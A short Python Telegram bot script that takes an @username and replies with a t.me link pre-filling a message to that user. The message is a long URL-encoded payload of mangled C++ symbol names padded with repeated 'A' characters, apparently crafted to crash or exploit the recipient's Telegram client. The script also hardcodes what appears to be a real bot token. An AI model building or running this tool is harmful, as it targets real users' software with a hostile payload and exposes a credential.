import requests
import time

TOKEN = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
PAYLOAD = '%40%3F1%3F%3Fdownload_single_file_task%40DownloadManager%40%40AEAXAXAEBV%3F%24shared_ptr%40DownloadTask%40%40%402%40AEAVWaitGroup%40marl%40%40AEAV%3F%24shared_ptr%40std%40%40%402%40%40Z%40AEBVClientFile%40%40AEAH%40std%40%40......%5D%40......%3FAV%3Clambda_2%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40.........5D%40......%3FAV%3Clambda_3%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40......%5D%40......%3FAV%3Clambda_1%3E%40%3F5%3F%3F%3FR0%3F1%3F%3Fentry%40%40YAXXZ%40QEB%40XZ%40...%5D%40......%3FAVout_of_range%40detail%40json_abi_v3_11_3%40nlohmann%40%40......ager%40%40AEAXXAEBV%3F%24sha2%40%40Z%40AEBV62%40AEBV78%40%40std%40%40...%5D%40......%3FAV%3Clambda_3%3E%40%3F1%3F%3F%3FWebView2%40%40QEA%40PEAVLoader%40%40%40Z%40......%5D%40......%3FAV%3Clambda_1%3E%40%3F1%3F%3Finit%40DownloadManager%40%40QEAXXZ%40......%5D%40......%3FA%40QEBXXZ%40......%5D%40......%3FAV%3Clambda_4%3E%40%3F1%3F%3F%3FWebView2%40%40QEA%40PEAVLoader%40%40%40Z%40......%5D%40......AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%3F'

def send_message(chat_id, text):
    url = f'https://api.telegram.org/bot{TOKEN}/sendMessage'
    data = {'chat_id': chat_id, 'text': text}
    requests.post(url, data=data).json()

def get_updates(offset=None):
    url = f'https://api.telegram.org/bot{TOKEN}/getUpdates'
    params = {'timeout': 30, 'offset': offset}
    r = requests.get(url, params=params)
    return r.json()['result']

last_id = None
while True:
    updates = get_updates(last_id)
    for upd in updates:
        last_id = upd['update_id'] + 1
        msg = upd.get('message')
        if not msg:
            continue
        text = msg.get('text', '')
        if text.startswith('@'):
            user = text.split()[0].lstrip('@')
            link = f'https://t.me/{user}?text={PAYLOAD}'
            send_message(msg['chat']['id'], link)
        else:
            send_message(msg['chat']['id'], 'Отправь @username')
    time.sleep(1)
